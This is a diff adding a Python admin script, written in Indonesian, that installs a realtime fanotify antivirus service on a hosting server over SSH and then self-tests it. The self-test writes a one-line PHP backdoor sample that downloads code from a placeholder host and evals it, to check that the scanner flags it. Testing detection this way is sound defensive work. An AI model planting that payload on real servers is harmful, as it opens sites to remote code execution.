@@ -1,0 +1,132 @@
+#!/usr/bin/env python3
+"""Pasang / perbarui / copot VelocityGuard realtime (watcher fanotify antivirus) di satu server hosting.
+
+  velocity-av-realtime-pasang <server>            pasang atau perbarui (agen.py + watcher + unit systemd)
+  velocity-av-realtime-pasang <server> --status   hanya baca status
+  velocity-av-realtime-pasang <server> --copot    hentikan & hapus unit (data /var/lib/velocity-av tetap)
+
+<server> = nama atau host dari daftar server dashboard (mis. Farnaz).
+
+Berkas di server: /usr/local/lib/velocity-av/{agen.py = scripts/server_antivirus_agent.py, velocity_av_realtime.py},
+/etc/systemd/system/velocity-av-realtime.service (Nice 10, IO idle, CPUQuota 25%, MemoryMax 400M).
+Uji sesudah pasang: berkas uji di /home/velocity-av-uji/domains/uji.invalid/public_html/ (bukan akun klien) harus
+tercatat di /var/lib/velocity-av/temuan.jsonl dalam 10 dtk; folder uji dan barisnya dihapus lagi. Gagal → unit dihentikan.
+"""
+import argparse
+import base64
+import subprocess
+import sys
+from pathlib import Path
+
+AKAR = Path(__file__).resolve().parent.parent
+sys.path.insert(0, str(AKAR / 'services'))
+import installer_status as ist  # noqa: E402
+
+UNIT = """[Unit]
+Description=VelocityGuard realtime antivirus (fanotify /home)
+After=local-fs.target
+
+[Service]
+ExecStart={python} /usr/local/lib/velocity-av/velocity_av_realtime.py
+Restart=always
+RestartSec=10
+Nice=10
+IOSchedulingClass=idle
+CPUQuota=25%
+MemoryMax=400M
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+STATUS = r"""
+echo "aktif=$(systemctl is-active velocity-av-realtime 2>/dev/null)"
+echo "enabled=$(systemctl is-enabled velocity-av-realtime 2>/dev/null)"
+echo "sidik=$(sha256sum /usr/local/lib/velocity-av/agen.py 2>/dev/null | cut -c1-12)"
+echo "detak=$(cat /var/lib/velocity-av/detak.json 2>/dev/null)"
+echo "temuan=$(wc -l < /var/lib/velocity-av/temuan.jsonl 2>/dev/null)"
+journalctl -u velocity-av-realtime -n 3 --no-pager -o cat 2>/dev/null | sed 's/^/log: /'
+"""
+
+# Isi uji: pola VD.PHP.EvalUnduhTag (string saja, tidak pernah dijalankan; folder uji tanpa vhost)
+UJI = "<?php $u='https://contoh.invalid/a.txt'; $b=file_get_contents($u); eval('?>' . $b);"
+
+
+def server(nama):
+    for item in ist.load_servers():
+        if isinstance(item, dict):
+            s, err = ist.clean_server(item)
+            if not err and nama.lower() in (s['name'].lower(), s['host']):
+                return s
+    raise SystemExit(f'server tidak dikenal: {nama}')
+
+
+def jalankan(srv, skrip, batas=180):
+    key = ist.ssh_key_file()
+    if not key:
+        raise SystemExit('kunci SSH installer tidak ada')
+    r = subprocess.run(ist.perintah_server(srv, key, 'bash -s'), input=skrip, capture_output=True, text=True, timeout=batas)
+    return r.returncode, (r.stdout + r.stderr).strip()
+
+
+def skrip_pasang():
+    agen = base64.b64encode((AKAR / 'scripts' / 'server_antivirus_agent.py').read_bytes()).decode()
+    watcher = base64.b64encode((AKAR / 'scripts' / 'velocity_av_realtime.py').read_bytes()).decode()
+    uji = base64.b64encode(UJI.encode()).decode()
+    unit = UNIT.replace('{python}', '$PY')
+    return f"""set -e
+PY=$(command -v python3 || echo /usr/libexec/platform-python)
+$PY -c 'import ctypes; assert ctypes.CDLL(None).fanotify_init' || {{ echo 'GAGAL: fanotify tidak tersedia'; exit 1; }}
+install -d -m 755 /usr/local/lib/velocity-av
+install -d -m 700 /var/lib/velocity-av
+echo '{agen}' | base64 -d > /usr/local/lib/velocity-av/agen.py.baru
+echo '{watcher}' | base64 -d > /usr/local/lib/velocity-av/velocity_av_realtime.py.baru
+$PY -c 'import ast,sys; [ast.parse(open(f).read()) for f in sys.argv[1:]]' /usr/local/lib/velocity-av/agen.py.baru /usr/local/lib/velocity-av/velocity_av_realtime.py.baru
+chmod 644 /usr/local/lib/velocity-av/*.baru
+mv -f /usr/local/lib/velocity-av/agen.py.baru /usr/local/lib/velocity-av/agen.py
+mv -f /usr/local/lib/velocity-av/velocity_av_realtime.py.baru /usr/local/lib/velocity-av/velocity_av_realtime.py
+cat > /etc/systemd/system/velocity-av-realtime.service <<UNIT
+{unit}UNIT
+systemctl daemon-reload
+systemctl enable velocity-av-realtime >/dev/null 2>&1
+systemctl restart velocity-av-realtime
+sleep 3
+systemctl is-active --quiet velocity-av-realtime || {{ echo 'GAGAL: layanan tidak jalan'; journalctl -u velocity-av-realtime -n 15 --no-pager -o cat; exit 1; }}
+# Uji: tulis berkas berpola backdoor di folder uji (bukan akun klien), harus tercatat
+U=/home/velocity-av-uji/domains/uji.invalid/public_html
+mkdir -p $U
+echo '{uji}' | base64 -d > $U/vav-uji.php
+OK=
+for i in 1 2 3 4 5 6 7 8 9 10; do grep -q "$U/vav-uji.php" /var/lib/velocity-av/temuan.jsonl 2>/dev/null && OK=1 && break; sleep 1; done
+rm -rf /home/velocity-av-uji
+sed -i '\\#/home/velocity-av-uji/#d' /var/lib/velocity-av/temuan.jsonl 2>/dev/null || true
+if [ -z "$OK" ]; then
+  systemctl disable --now velocity-av-realtime >/dev/null 2>&1
+  echo 'GAGAL: berkas uji tidak terdeteksi — layanan dihentikan'
+  journalctl -u velocity-av-realtime -n 15 --no-pager -o cat
+  exit 1
+fi
+echo 'UJI OK: berkas uji terdeteksi'
+{STATUS}"""
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument('server')
+    ap.add_argument('--status', action='store_true')
+    ap.add_argument('--copot', action='store_true')
+    a = ap.parse_args()
+    srv = server(a.server)
+    if a.status:
+        skrip = STATUS
+    elif a.copot:
+        skrip = 'systemctl disable --now velocity-av-realtime 2>&1; rm -f /etc/systemd/system/velocity-av-realtime.service; systemctl daemon-reload; echo dicopot'
+    else:
+        skrip = skrip_pasang()
+    kode, keluar = jalankan(srv, skrip)
+    print(f"[{srv['name']}] {keluar}")
+    sys.exit(kode)
+
+
+if __name__ == '__main__':
+    main()
